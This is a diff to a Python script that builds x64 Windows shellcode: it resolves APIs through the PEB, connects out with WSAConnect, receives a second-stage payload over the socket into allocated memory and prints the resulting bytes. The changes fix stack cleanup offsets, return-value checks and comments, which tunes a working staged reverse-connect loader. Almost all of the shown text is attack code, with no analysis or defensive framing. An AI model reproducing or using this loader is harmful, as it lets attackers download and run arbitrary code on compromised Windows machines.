@@ -18,6 +18,7 @@ def main():
         "   mov rsi, [rsi+0x20]             ;"  # 0x20 Offset = PEB.Ldr.InMemoryOrderModuleList
         
         " next_module:                      "
+        "   xor cl, cl                      ;"  # Clear CL
         "   mov rbx, [rsi+0x20]             ;"  # DllBase, InMem + 0x30 - 0x10
         "   mov rdi, [rsi+0x50]             ;"  # ModName, InMem + 0x58 - 0x10 + 0x8 (Buffer)
         "   mov rsi, [rsi]                  ;"  # RSI = InMem.Flink (next module)
@@ -81,7 +82,7 @@ def main():
         "   jz compute_hash_done            ;"  # Finish hashing when ZF is set
         "   ror edx, 0x0d                   ;"  # Rotate RDX 13 bits to the right
         "   add edx, eax                    ;"  # Add new bytes to RDX
-        "   jmp compute_hash_again         ;"  # Compute hash for next byte
+        "   jmp compute_hash_again          ;"  # Compute hash for next byte
         
         " compute_hash_done:                "
         
@@ -188,7 +189,7 @@ def main():
         "   cmp ax, 0xffff                  ;"  # Check return
         "   je call_terminate_process       ;"
         "   mov [rbp+0x58], rax             ;"  # Save socket handle to [rbp+0x58]
-        "   add rsp, 0x228                  ;"  # Cleanup
+        "   add rsp, 0x238                  ;"  # Cleanup
         
         " call_wsaconnect:                  "
         "   add rsp, 0xffffffffffffff00     ;"  # Allocate stack space for sockaddr_in struct
@@ -207,7 +208,7 @@ def main():
         "   call qword ptr [rbp+0x48]       ;"  # Call WSAConnect
         "   test al, al                     ;"  # Check return
         "   jnz call_terminate_process      ;"  # If not zero, terminate process
-        "   add rsp, 0x120                  ;"  # Cleanup
+        "   add rsp, 0x148                  ;"  # Cleanup
         
         " prep_call_recv:                   "  # Prepare arguments to call recv, so call_recv can be resued
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
@@ -243,7 +244,7 @@ def main():
         "   add edx, 0x10                   ;"  # Compensate for additional "mov edx, ..." instruction
         "   add rsp, 0xffffffffffffffe0     ;"  # Home space
         "   call qword ptr [rbp+0x28]       ;"  # Call LocalAlloc
-        "   test al, al                     ;"  # Check return
+        "   test eax, eax                   ;"  # Check return
         "   jz call_terminate_process       ;"  # If NULL, terminate process 
         "   mov [rbp+0x68], rax             ;"  # Save handle to buffer to [rbp+0x68]
         "   add rsp, 0xa0                   ;"  # Cleanup
@@ -253,7 +254,7 @@ def main():
         "   mov ecx, 0xbd41                 ;"  # mov r13d, socket; xor rdi, rdi; mov edi, r13d; break \xbf signature
         "   mov [rax], ecx                  ;"
         "   mov ecx, [rbp+0x58]             ;"  # Move SOCKET handle to ECX
-        "   mov [rax+0x2], ecx              ;"  # Move SOCKET handle to [rax+0x4]
+        "   mov [rax+0x2], ecx              ;"  # Move SOCKET handle to [rax+0x2]
         "   mov rcx, 0xef8944ff3148         ;"  # Rest of the opcode
         "   mov [rax+0x6], rcx              ;"  # Move rest of the opcode to position
         
@@ -275,7 +276,7 @@ def main():
         "   mov r12, [rbp+0x60]             ;"  # Move stage 2 size to R12
         "   sub r12, rdi                    ;"  # Subtract current total received bytes from stage 2 size
         "   cmp rdi, [rbp+0x60]             ;"  # Compare received bytes to stage 2 size
-        "   jl  call_recv                   ;"  # If received bytes < stage 2 size, keep recv data
+        "   jl call_recv                    ;"  # If received bytes < stage 2 size, keep recv data
 
         " recv_end:                         "  # Have received all stage 2 payload
         "   add rsp, 0x80                   ;"  # Cleanup
@@ -314,7 +315,6 @@ def main():
         sh += struct.pack("B", opcode)                          # To encode for execution
         output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
  
- 
     shellcode = bytearray(sh)
     print("Shellcode: "  + output )
     print("Bytes: " + str(len(sh)))
@@ -334,4 +334,5 @@ def main():
  
 if __name__ == "__main__":
     main()
+
 
